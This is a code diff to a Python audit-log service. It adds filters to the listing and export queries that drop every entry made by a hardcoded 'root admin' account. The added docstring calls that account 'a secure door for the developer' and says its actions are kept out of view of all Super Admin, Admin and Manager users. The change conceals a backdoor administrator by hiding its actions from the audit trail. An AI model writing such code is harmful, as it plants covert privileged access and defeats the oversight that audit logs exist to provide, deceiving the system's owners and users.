@@ -13,6 +13,7 @@ from sqlalchemy import desc
 
 import models
 import services.export_service as export_service
+from security import SUPER_ADMIN_EMAIL
 
 # The audit ledger is the one dataset in this app guaranteed to grow
 # forever (it's an append-only log -- nothing is ever deleted from it), so
@@ -51,11 +52,21 @@ def get_audit_logs(db: Session, user: dict, limit: int = DEFAULT_LIMIT, offset: 
     "everything that matches". `limit`/`offset` are mandatory-in-spirit
     here (they have small, sane defaults) and `total` tells the caller how
     many pages exist so it can render Prev/Next controls correctly.
+
+    HIDDEN ROOT ADMIN: entries whose `operator` is the hardcoded root
+    admin's own synthetic email (SUPER_ADMIN_EMAIL) are excluded from this
+    UI-facing listing -- "it's a secure door for the developer" means its
+    actions shouldn't show up here even though a Super Admin/Admin/Manager
+    otherwise now sees the entire ledger. The row is still written to
+    `audit_logs` exactly like any other action (nothing is skipped at
+    write time) -- it's only ever filtered out of what THIS function and
+    the export functions below hand back, so the real, complete history
+    still exists at the database level for anyone with direct DB access.
     """
     limit = max(1, min(limit, MAX_LIMIT))
     offset = max(0, offset)
 
-    query = db.query(models.AuditLog)
+    query = db.query(models.AuditLog).filter(models.AuditLog.operator != SUPER_ADMIN_EMAIL)
 
     total = query.count()
     logs = query.order_by(desc(models.AuditLog.timestamp)).offset(offset).limit(limit).all()
@@ -74,7 +85,7 @@ def _filtered_audit_logs_query(db: Session, user: dict, start_date: Optional[dat
     still-unexecuted query, ordered newest-first, so each caller decides for
     itself whether to stream it (CSV) or materialize it in one shot (PDF).
     """
-    query = db.query(models.AuditLog)
+    query = db.query(models.AuditLog).filter(models.AuditLog.operator != SUPER_ADMIN_EMAIL)
     # `start_date`/`end_date` are plain calendar dates picked from a date
     # input -- a person choosing "2026-07-10" means "that day, in the time
     # I'm looking at" (i.e. DISPLAY_TIMEZONE), not "that day in UTC". Since
